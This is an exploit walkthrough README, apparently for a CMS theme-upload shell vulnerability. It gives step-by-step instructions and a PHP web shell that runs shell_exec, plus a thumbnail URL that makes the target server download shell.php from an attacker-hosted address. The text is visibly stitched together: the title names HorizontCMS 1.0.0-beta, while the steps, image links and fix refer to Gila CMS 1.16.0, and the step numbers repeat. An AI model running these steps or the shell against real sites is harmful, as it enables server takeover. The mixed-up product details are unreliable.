# HorizontCMS-1.0.0-beta-shell-upload

Author: jkana
----

The vulnerable is in Theme's upload function.

1.Login as administrator or any users could change themes.

2.Create a zip file which have php shell inside. For example **shell.zip** with **shell.php** inside

![]()

2.Access to **http://IP/admin/theme/index** . For example:
```http://192.168.10.67:81/hcms/admin/theme/index```

![]()

3.Click **+File** and create **.htaccess**:

![](https://github.com/jkana/Gila-CMS-1.16.0-shell-upload/raw/main/Images/2.JPG)

4.Use this URL for downloading shell to gila's tmp directory **http://IP/lzld/thumb?size=600&src=SHELL_URL** .For example:
```http://192.168.0.105:1234/gila16/lzld/thumb?size=600&src=http://192.168.0.105:1234/files/shell.php```

5.We can check shell name with **http://IP/admin/fm?f=tmp/**

![](https://github.com/jkana/Gila-CMS-1.16.0-shell-upload/raw/main/Images/3.JPG)

6.Access to webshell and got RCE!

![](https://github.com/jkana/Gila-CMS-1.16.0-shell-upload/raw/main/Images/4.JPG)

----
# How to fix

Update to **Gila CMS 1.16.1**
----
## shell.php
```
<?php
$output = shell_exec('ipconfig');
echo "<pre>$output</pre>";
?>
```
